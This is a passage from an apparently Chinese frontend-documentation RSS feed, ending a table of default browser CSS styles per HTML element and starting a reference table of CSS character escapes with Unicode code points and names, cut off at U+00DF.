<td style="text-align:left">display: inline-block;</td>
</tr>
<tr>
<td style="text-align:center">input</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">ins</td>
<td style="text-align:left">text-decoration: underline;</td>
</tr>
<tr>
<td style="text-align:center">kbd</td>
<td style="text-align:left">font-family: monospace;</td>
</tr>
<tr>
<td style="text-align:center">label</td>
<td style="text-align:left">cursor: default;</td>
</tr>
<tr>
<td style="text-align:center">legend</td>
<td style="text-align:left">display: block;<br>padding-left: 2px;<br>padding-right: 2px;<br>border: none;</td>
</tr>
<tr>
<td style="text-align:center">li</td>
<td style="text-align:left">display: list-item;</td>
</tr>
<tr>
<td style="text-align:center">link</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">main</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">map</td>
<td style="text-align:left">display: inline;</td>
</tr>
<tr>
<td style="text-align:center">mark</td>
<td style="text-align:left">background-color: yellow;<br>color: black;</td>
</tr>
<tr>
<td style="text-align:center">menu</td>
<td style="text-align:left">display: block;<br>list-style-type: disc;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 0;<br>margin-right: 0;<br>padding-left: 40px;</td>
</tr>
<tr>
<td style="text-align:center">menuitem</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">meta</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">meter</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">nav</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">noscript</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">object:focus</td>
<td style="text-align:left">outline: none;</td>
</tr>
<tr>
<td style="text-align:center">ol</td>
<td style="text-align:left">display: block;<br>list-style-type: decimal;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 0;<br>margin-right: 0;<br>padding-left: 40px;</td>
</tr>
<tr>
<td style="text-align:center">optgroup</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">option</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">output</td>
<td style="text-align:left">display: inline;</td>
</tr>
<tr>
<td style="text-align:center">p</td>
<td style="text-align:left">display: block;<br>margin-top: 1em;<br>margin-bottom: 1em;<br>margin-left: 0;<br>margin-right: 0;</td>
</tr>
<tr>
<td style="text-align:center">param</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">picture</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">pre</td>
<td style="text-align:left">display: block;<br>font-family: monospace;<br>white-space: pre;<br>margin: 1em 0;</td>
</tr>
<tr>
<td style="text-align:center">progress</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">q</td>
<td style="text-align:left">display: inline;</td>
</tr>
<tr>
<td style="text-align:center">q::before</td>
<td style="text-align:left">content: open-quote;</td>
</tr>
<tr>
<td style="text-align:center">q::after</td>
<td style="text-align:left">content: close-quote;</td>
</tr>
<tr>
<td style="text-align:center">rp</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">rt</td>
<td style="text-align:left">line-height: normal;</td>
</tr>
<tr>
<td style="text-align:center">ruby</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">s</td>
<td style="text-align:left">text-decoration: line-through;</td>
</tr>
<tr>
<td style="text-align:center">samp</td>
<td style="text-align:left">font-family: monospace;</td>
</tr>
<tr>
<td style="text-align:center">script</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">section</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">select</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">small</td>
<td style="text-align:left">font-size: smaller;</td>
</tr>
<tr>
<td style="text-align:center">source</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">span</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">strike</td>
<td style="text-align:left">text-decoration: line-through;</td>
</tr>
<tr>
<td style="text-align:center">strong</td>
<td style="text-align:left">font-weight: bold;</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">sub</td>
<td style="text-align:left">vertical-align: sub;<br>font-size: smaller;</td>
</tr>
<tr>
<td style="text-align:center">summary</td>
<td style="text-align:left">display: block;</td>
</tr>
<tr>
<td style="text-align:center">sup</td>
<td style="text-align:left">vertical-align: super;<br>font-size: smaller;</td>
</tr>
<tr>
<td style="text-align:center">table</td>
<td style="text-align:left">display: table;<br>border-collapse: separate;<br>border-spacing: 2px;<br>border-color: gray;</td>
</tr>
<tr>
<td style="text-align:center">tbody</td>
<td style="text-align:left">display: table-row-group;<br>vertical-align: middle;<br>border-color: inherit;</td>
</tr>
<tr>
<td style="text-align:center">td</td>
<td style="text-align:left">display: table-cell;<br>vertical-align: inherit;</td>
</tr>
<tr>
<td style="text-align:center">template</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">textarea</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">tfoot</td>
<td style="text-align:left">display: table-footer-group;<br>vertical-align: middle;<br>border-color: inherit;</td>
</tr>
<tr>
<td style="text-align:center">th</td>
<td style="text-align:left">display: table-cell;<br>vertical-align: inherit;<br>font-weight: bold;<br>text-align: center;</td>
</tr>
<tr>
<td style="text-align:center">thead</td>
<td style="text-align:left">display: table-header-group;<br>vertical-align: middle;<br>border-color: inherit;</td>
</tr>
<tr>
<td style="text-align:center">time</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:left">display: none;</td>
</tr>
<tr>
<td style="text-align:center">tr</td>
<td style="text-align:left">display: table-row;<br>vertical-align: inherit;<br>border-color: inherit;</td>
</tr>
<tr>
<td style="text-align:center">track</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">u</td>
<td style="text-align:left">text-decoration: underline;</td>
</tr>
<tr>
<td style="text-align:center">ul</td>
<td style="text-align:left">display: block;<br>list-style-type: disc;<br>margin-top: 1em;<br>margin-bottom: 1 em;<br>margin-left: 0;<br>margin-right: 0;<br>padding-left: 40px;</td>
</tr>
<tr>
<td style="text-align:center">var</td>
<td style="text-align:left">font-style: italic;</td>
</tr>
<tr>
<td style="text-align:center">video</td>
<td style="text-align:left">None.</td>
</tr>
<tr>
<td style="text-align:center">wbr</td>
<td style="text-align:left">None.</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>实体</title>
      <link>https://sankgao.github.io/languages/css3/references/entities.html</link>
      <guid>https://sankgao.github.io/languages/css3/references/entities.html</guid>
      <source url="https://sankgao.github.io/rss.xml">实体</source>
      <description>使用 CSS 实体可以显示 HTML 中任何字符。例如： 演示 在 CSS 中语法格式：&amp;apos; \00A7&amp;apos; 字符 CSS 实体 名称 :----: :----: :----: 0020 SPACE ! 0021 EXCLAMATION MARK &amp;quot; 0022 QUOTATION MARK # 0023 NUMBER SIGN $ 0024 DOLLAR ...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>使用 CSS 实体可以显示 HTML 中任何字符。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在 CSS 中语法格式：<code>' \00A7'</code></p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">CSS 实体</th>
<th style="text-align:center">名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">0020</td>
<td style="text-align:center">SPACE</td>
</tr>
<tr>
<td style="text-align:center">!</td>
<td style="text-align:center">0021</td>
<td style="text-align:center">EXCLAMATION MARK</td>
</tr>
<tr>
<td style="text-align:center">"</td>
<td style="text-align:center">0022</td>
<td style="text-align:center">QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">#</td>
<td style="text-align:center">0023</td>
<td style="text-align:center">NUMBER SIGN</td>
</tr>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">0024</td>
<td style="text-align:center">DOLLAR SIGN</td>
</tr>
<tr>
<td style="text-align:center">%</td>
<td style="text-align:center">0025</td>
<td style="text-align:center">PERCENT SIGN</td>
</tr>
<tr>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">0026</td>
<td style="text-align:center">AMPERSAND</td>
</tr>
<tr>
<td style="text-align:center">'</td>
<td style="text-align:center">0027</td>
<td style="text-align:center">APOSTROPHE</td>
</tr>
<tr>
<td style="text-align:center">(</td>
<td style="text-align:center">0028</td>
<td style="text-align:center">LEFT PARENTHESIS</td>
</tr>
<tr>
<td style="text-align:center">)</td>
<td style="text-align:center">0029</td>
<td style="text-align:center">RIGHT PARENTHESIS</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">002A</td>
<td style="text-align:center">ASTERISK</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td style="text-align:center">002B</td>
<td style="text-align:center">PLUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">,</td>
<td style="text-align:center">002C</td>
<td style="text-align:center">COMMA</td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center">002D</td>
<td style="text-align:center">HYPHEN-MINUS</td>
</tr>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">002E</td>
<td style="text-align:center">FULL STOP</td>
</tr>
<tr>
<td style="text-align:center">/</td>
<td style="text-align:center">002F</td>
<td style="text-align:center">SOLIDUS</td>
</tr>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0030</td>
<td style="text-align:center">DIGIT ZERO</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0031</td>
<td style="text-align:center">DIGIT ONE</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">0032</td>
<td style="text-align:center">DIGIT TWO</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">0033</td>
<td style="text-align:center">DIGIT THREE</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">0034</td>
<td style="text-align:center">DIGIT FOUR</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">0035</td>
<td style="text-align:center">DIGIT FIVE</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">0036</td>
<td style="text-align:center">DIGIT SIX</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">0037</td>
<td style="text-align:center">DIGIT SEVEN</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">0038</td>
<td style="text-align:center">DIGIT EIGHT</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">0039</td>
<td style="text-align:center">DIGIT NINE</td>
</tr>
<tr>
<td style="text-align:center">:</td>
<td style="text-align:center">003A</td>
<td style="text-align:center">COLON</td>
</tr>
<tr>
<td style="text-align:center">;</td>
<td style="text-align:center">003B</td>
<td style="text-align:center">SEMICOLON</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">003C</td>
<td style="text-align:center">LESS-THAN SIGN</td>
</tr>
<tr>
<td style="text-align:center">=</td>
<td style="text-align:center">003D</td>
<td style="text-align:center">EQUALS SIGN</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">003E</td>
<td style="text-align:center">GREATER-THAN SIGN</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td style="text-align:center">003F</td>
<td style="text-align:center">QUESTION MARK</td>
</tr>
<tr>
<td style="text-align:center">@</td>
<td style="text-align:center">0040</td>
<td style="text-align:center">COMMERCIAL AT</td>
</tr>
<tr>
<td style="text-align:center">A</td>
<td style="text-align:center">0041</td>
<td style="text-align:center">LATIN CAPITAL LETTER A</td>
</tr>
<tr>
<td style="text-align:center">B</td>
<td style="text-align:center">0042</td>
<td style="text-align:center">LATIN CAPITAL LETTER B</td>
</tr>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:center">0043</td>
<td style="text-align:center">LATIN CAPITAL LETTER C</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:center">0044</td>
<td style="text-align:center">LATIN CAPITAL LETTER D</td>
</tr>
<tr>
<td style="text-align:center">E</td>
<td style="text-align:center">0045</td>
<td style="text-align:center">LATIN CAPITAL LETTER E</td>
</tr>
<tr>
<td style="text-align:center">F</td>
<td style="text-align:center">0046</td>
<td style="text-align:center">LATIN CAPITAL LETTER F</td>
</tr>
<tr>
<td style="text-align:center">G</td>
<td style="text-align:center">0047</td>
<td style="text-align:center">LATIN CAPITAL LETTER G</td>
</tr>
<tr>
<td style="text-align:center">H</td>
<td style="text-align:center">0048</td>
<td style="text-align:center">LATIN CAPITAL LETTER H</td>
</tr>
<tr>
<td style="text-align:center">I</td>
<td style="text-align:center">0049</td>
<td style="text-align:center">LATIN CAPITAL LETTER I</td>
</tr>
<tr>
<td style="text-align:center">J</td>
<td style="text-align:center">004A</td>
<td style="text-align:center">LATIN CAPITAL LETTER J</td>
</tr>
<tr>
<td style="text-align:center">K</td>
<td style="text-align:center">004B</td>
<td style="text-align:center">LATIN CAPITAL LETTER K</td>
</tr>
<tr>
<td style="text-align:center">L</td>
<td style="text-align:center">004C</td>
<td style="text-align:center">LATIN CAPITAL LETTER L</td>
</tr>
<tr>
<td style="text-align:center">M</td>
<td style="text-align:center">004D</td>
<td style="text-align:center">LATIN CAPITAL LETTER M</td>
</tr>
<tr>
<td style="text-align:center">N</td>
<td style="text-align:center">004E</td>
<td style="text-align:center">LATIN CAPITAL LETTER N</td>
</tr>
<tr>
<td style="text-align:center">O</td>
<td style="text-align:center">004F</td>
<td style="text-align:center">LATIN CAPITAL LETTER O</td>
</tr>
<tr>
<td style="text-align:center">P</td>
<td style="text-align:center">0050</td>
<td style="text-align:center">LATIN CAPITAL LETTER P</td>
</tr>
<tr>
<td style="text-align:center">Q</td>
<td style="text-align:center">0051</td>
<td style="text-align:center">LATIN CAPITAL LETTER Q</td>
</tr>
<tr>
<td style="text-align:center">R</td>
<td style="text-align:center">0052</td>
<td style="text-align:center">LATIN CAPITAL LETTER R</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">0053</td>
<td style="text-align:center">LATIN CAPITAL LETTER S</td>
</tr>
<tr>
<td style="text-align:center">T</td>
<td style="text-align:center">0054</td>
<td style="text-align:center">LATIN CAPITAL LETTER T</td>
</tr>
<tr>
<td style="text-align:center">U</td>
<td style="text-align:center">0055</td>
<td style="text-align:center">LATIN CAPITAL LETTER U</td>
</tr>
<tr>
<td style="text-align:center">V</td>
<td style="text-align:center">0056</td>
<td style="text-align:center">LATIN CAPITAL LETTER V</td>
</tr>
<tr>
<td style="text-align:center">W</td>
<td style="text-align:center">0057</td>
<td style="text-align:center">LATIN CAPITAL LETTER W</td>
</tr>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:center">0058</td>
<td style="text-align:center">LATIN CAPITAL LETTER X</td>
</tr>
<tr>
<td style="text-align:center">Y</td>
<td style="text-align:center">0059</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y</td>
</tr>
<tr>
<td style="text-align:center">Z</td>
<td style="text-align:center">005A</td>
<td style="text-align:center">LATIN CAPITAL LETTER Z</td>
</tr>
<tr>
<td style="text-align:center">[</td>
<td style="text-align:center">005B</td>
<td style="text-align:center">LEFT SQUARE BRACKET</td>
</tr>
<tr>
<td style="text-align:center">\</td>
<td style="text-align:center">005C</td>
<td style="text-align:center">REVERSE SOLIDUS</td>
</tr>
<tr>
<td style="text-align:center">]</td>
<td style="text-align:center">005D</td>
<td style="text-align:center">RIGHT SQUARE BRACKET</td>
</tr>
<tr>
<td style="text-align:center">^</td>
<td style="text-align:center">005E</td>
<td style="text-align:center">CIRCUMFLEX ACCENT</td>
</tr>
<tr>
<td style="text-align:center">_</td>
<td style="text-align:center">005F</td>
<td style="text-align:center">LOW LINE</td>
</tr>
<tr>
<td style="text-align:center">`</td>
<td style="text-align:center">0060</td>
<td style="text-align:center">GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">a</td>
<td style="text-align:center">0061</td>
<td style="text-align:center">LATIN SMALL LETTER A</td>
</tr>
<tr>
<td style="text-align:center">b</td>
<td style="text-align:center">0062</td>
<td style="text-align:center">LATIN SMALL LETTER B</td>
</tr>
<tr>
<td style="text-align:center">c</td>
<td style="text-align:center">0063</td>
<td style="text-align:center">LATIN SMALL LETTER C</td>
</tr>
<tr>
<td style="text-align:center">d</td>
<td style="text-align:center">0064</td>
<td style="text-align:center">LATIN SMALL LETTER D</td>
</tr>
<tr>
<td style="text-align:center">e</td>
<td style="text-align:center">0065</td>
<td style="text-align:center">LATIN SMALL LETTER E</td>
</tr>
<tr>
<td style="text-align:center">f</td>
<td style="text-align:center">0066</td>
<td style="text-align:center">LATIN SMALL LETTER F</td>
</tr>
<tr>
<td style="text-align:center">g</td>
<td style="text-align:center">0067</td>
<td style="text-align:center">LATIN SMALL LETTER G</td>
</tr>
<tr>
<td style="text-align:center">h</td>
<td style="text-align:center">0068</td>
<td style="text-align:center">LATIN SMALL LETTER H</td>
</tr>
<tr>
<td style="text-align:center">i</td>
<td style="text-align:center">0069</td>
<td style="text-align:center">LATIN SMALL LETTER I</td>
</tr>
<tr>
<td style="text-align:center">j</td>
<td style="text-align:center">006A</td>
<td style="text-align:center">LATIN SMALL LETTER J</td>
</tr>
<tr>
<td style="text-align:center">k</td>
<td style="text-align:center">006B</td>
<td style="text-align:center">LATIN SMALL LETTER K</td>
</tr>
<tr>
<td style="text-align:center">l</td>
<td style="text-align:center">006C</td>
<td style="text-align:center">LATIN SMALL LETTER L</td>
</tr>
<tr>
<td style="text-align:center">m</td>
<td style="text-align:center">006D</td>
<td style="text-align:center">LATIN SMALL LETTER M</td>
</tr>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">006E</td>
<td style="text-align:center">LATIN SMALL LETTER N</td>
</tr>
<tr>
<td style="text-align:center">o</td>
<td style="text-align:center">006F</td>
<td style="text-align:center">LATIN SMALL LETTER O</td>
</tr>
<tr>
<td style="text-align:center">p</td>
<td style="text-align:center">0070</td>
<td style="text-align:center">LATIN SMALL LETTER P</td>
</tr>
<tr>
<td style="text-align:center">q</td>
<td style="text-align:center">0071</td>
<td style="text-align:center">LATIN SMALL LETTER Q</td>
</tr>
<tr>
<td style="text-align:center">r</td>
<td style="text-align:center">0072</td>
<td style="text-align:center">LATIN SMALL LETTER R</td>
</tr>
<tr>
<td style="text-align:center">s</td>
<td style="text-align:center">0073</td>
<td style="text-align:center">LATIN SMALL LETTER S</td>
</tr>
<tr>
<td style="text-align:center">t</td>
<td style="text-align:center">0074</td>
<td style="text-align:center">LATIN SMALL LETTER T</td>
</tr>
<tr>
<td style="text-align:center">u</td>
<td style="text-align:center">0075</td>
<td style="text-align:center">LATIN SMALL LETTER U</td>
</tr>
<tr>
<td style="text-align:center">v</td>
<td style="text-align:center">0076</td>
<td style="text-align:center">LATIN SMALL LETTER V</td>
</tr>
<tr>
<td style="text-align:center">w</td>
<td style="text-align:center">0077</td>
<td style="text-align:center">LATIN SMALL LETTER W</td>
</tr>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">0078</td>
<td style="text-align:center">LATIN SMALL LETTER X</td>
</tr>
<tr>
<td style="text-align:center">y</td>
<td style="text-align:center">0079</td>
<td style="text-align:center">LATIN SMALL LETTER Y</td>
</tr>
<tr>
<td style="text-align:center">z</td>
<td style="text-align:center">007A</td>
<td style="text-align:center">LATIN SMALL LETTER Z</td>
</tr>
<tr>
<td style="text-align:center">{</td>
<td style="text-align:center">007B</td>
<td style="text-align:center">LEFT CURLY BRACKET</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">007C</td>
</tr>
<tr>
<td style="text-align:center">}</td>
<td style="text-align:center">007D</td>
<td style="text-align:center">RIGHT CURLY BRACKET</td>
</tr>
<tr>
<td style="text-align:center">~</td>
<td style="text-align:center">007E</td>
<td style="text-align:center">TILDE</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">00A0</td>
<td style="text-align:center">NO-BREAK SPACE</td>
</tr>
<tr>
<td style="text-align:center">¡</td>
<td style="text-align:center">00A1</td>
<td style="text-align:center">INVERTED EXCLAMATION MARK</td>
</tr>
<tr>
<td style="text-align:center">¢</td>
<td style="text-align:center">00A2</td>
<td style="text-align:center">CENT SIGN</td>
</tr>
<tr>
<td style="text-align:center">£</td>
<td style="text-align:center">00A3</td>
<td style="text-align:center">POUND SIGN</td>
</tr>
<tr>
<td style="text-align:center">¤</td>
<td style="text-align:center">00A4</td>
<td style="text-align:center">CURRENCY SIGN</td>
</tr>
<tr>
<td style="text-align:center">¥</td>
<td style="text-align:center">00A5</td>
<td style="text-align:center">YEN SIGN</td>
</tr>
<tr>
<td style="text-align:center">¦</td>
<td style="text-align:center">00A6</td>
<td style="text-align:center">BROKEN BAR</td>
</tr>
<tr>
<td style="text-align:center">§</td>
<td style="text-align:center">00A7</td>
<td style="text-align:center">SECTION SIGN</td>
</tr>
<tr>
<td style="text-align:center">¨</td>
<td style="text-align:center">00A8</td>
<td style="text-align:center">DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">©</td>
<td style="text-align:center">00A9</td>
<td style="text-align:center">COPYRIGHT SIGN</td>
</tr>
<tr>
<td style="text-align:center">ª</td>
<td style="text-align:center">00AA</td>
<td style="text-align:center">FEMININE ORDINAL INDICATOR</td>
</tr>
<tr>
<td style="text-align:center">«</td>
<td style="text-align:center">00AB</td>
<td style="text-align:center">LEFT-POINTING DOUBLE ANGLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">¬</td>
<td style="text-align:center">00AC</td>
<td style="text-align:center">NOT SIGN</td>
</tr>
<tr>
<td style="text-align:center">­</td>
<td style="text-align:center">00AD</td>
<td style="text-align:center">SOFT HYPHEN</td>
</tr>
<tr>
<td style="text-align:center">®</td>
<td style="text-align:center">00AE</td>
<td style="text-align:center">REGISTERED SIGN</td>
</tr>
<tr>
<td style="text-align:center">¯</td>
<td style="text-align:center">00AF</td>
<td style="text-align:center">MACRON</td>
</tr>
<tr>
<td style="text-align:center">°</td>
<td style="text-align:center">00B0</td>
<td style="text-align:center">DEGREE SIGN</td>
</tr>
<tr>
<td style="text-align:center">±</td>
<td style="text-align:center">00B1</td>
<td style="text-align:center">PLUS-MINUS SIGN</td>
</tr>
<tr>
<td style="text-align:center">²</td>
<td style="text-align:center">00B2</td>
<td style="text-align:center">SUPERSCRIPT TWO</td>
</tr>
<tr>
<td style="text-align:center">³</td>
<td style="text-align:center">00B3</td>
<td style="text-align:center">SUPERSCRIPT THREE</td>
</tr>
<tr>
<td style="text-align:center">´</td>
<td style="text-align:center">00B4</td>
<td style="text-align:center">ACUTE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">µ</td>
<td style="text-align:center">00B5</td>
<td style="text-align:center">MICRO SIGN</td>
</tr>
<tr>
<td style="text-align:center">¶</td>
<td style="text-align:center">00B6</td>
<td style="text-align:center">PILCROW SIGN</td>
</tr>
<tr>
<td style="text-align:center">·</td>
<td style="text-align:center">00B7</td>
<td style="text-align:center">MIDDLE DOT</td>
</tr>
<tr>
<td style="text-align:center">¸</td>
<td style="text-align:center">00B8</td>
<td style="text-align:center">CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">¹</td>
<td style="text-align:center">00B9</td>
<td style="text-align:center">SUPERSCRIPT ONE</td>
</tr>
<tr>
<td style="text-align:center">º</td>
<td style="text-align:center">00BA</td>
<td style="text-align:center">MASCULINE ORDINAL INDICATOR</td>
</tr>
<tr>
<td style="text-align:center">»</td>
<td style="text-align:center">00BB</td>
<td style="text-align:center">RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK</td>
</tr>
<tr>
<td style="text-align:center">¼</td>
<td style="text-align:center">00BC</td>
<td style="text-align:center">VULGAR FRACTION ONE QUARTER</td>
</tr>
<tr>
<td style="text-align:center">½</td>
<td style="text-align:center">00BD</td>
<td style="text-align:center">VULGAR FRACTION ONE HALF</td>
</tr>
<tr>
<td style="text-align:center">¾</td>
<td style="text-align:center">00BE</td>
<td style="text-align:center">VULGAR FRACTION THREE QUARTERS</td>
</tr>
<tr>
<td style="text-align:center">¿</td>
<td style="text-align:center">00BF</td>
<td style="text-align:center">INVERTED QUESTION MARK</td>
</tr>
<tr>
<td style="text-align:center">À</td>
<td style="text-align:center">00C0</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Á</td>
<td style="text-align:center">00C1</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Â</td>
<td style="text-align:center">00C2</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ã</td>
<td style="text-align:center">00C3</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">Ä</td>
<td style="text-align:center">00C4</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Å</td>
<td style="text-align:center">00C5</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Æ</td>
<td style="text-align:center">00C6</td>
<td style="text-align:center">LATIN CAPITAL LETTER AE</td>
</tr>
<tr>
<td style="text-align:center">Ç</td>
<td style="text-align:center">00C7</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">È</td>
<td style="text-align:center">00C8</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">É</td>
<td style="text-align:center">00C9</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ê</td>
<td style="text-align:center">00CA</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ë</td>
<td style="text-align:center">00CB</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ì</td>
<td style="text-align:center">00CC</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Í</td>
<td style="text-align:center">00CD</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Î</td>
<td style="text-align:center">00CE</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ï</td>
<td style="text-align:center">00CF</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ð</td>
<td style="text-align:center">00D0</td>
<td style="text-align:center">LATIN CAPITAL LETTER ETH</td>
</tr>
<tr>
<td style="text-align:center">Ñ</td>
<td style="text-align:center">00D1</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">Ò</td>
<td style="text-align:center">00D2</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ó</td>
<td style="text-align:center">00D3</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ô</td>
<td style="text-align:center">00D4</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Õ</td>
<td style="text-align:center">00D5</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">Ö</td>
<td style="text-align:center">00D6</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">×</td>
<td style="text-align:center">00D7</td>
<td style="text-align:center">MULTIPLICATION SIGN</td>
</tr>
<tr>
<td style="text-align:center">Ø</td>
<td style="text-align:center">00D8</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ù</td>
<td style="text-align:center">00D9</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">Ú</td>
<td style="text-align:center">00DA</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Û</td>
<td style="text-align:center">00DB</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ü</td>
<td style="text-align:center">00DC</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ý</td>
<td style="text-align:center">00DD</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Þ</td>
<td style="text-align:center">00DE</td>
<td style="text-align:center">LATIN CAPITAL LETTER THORN</td>
</tr>
<tr>
<td style="text-align:center">ß</td>
<td style="text-align:center">00DF</td>
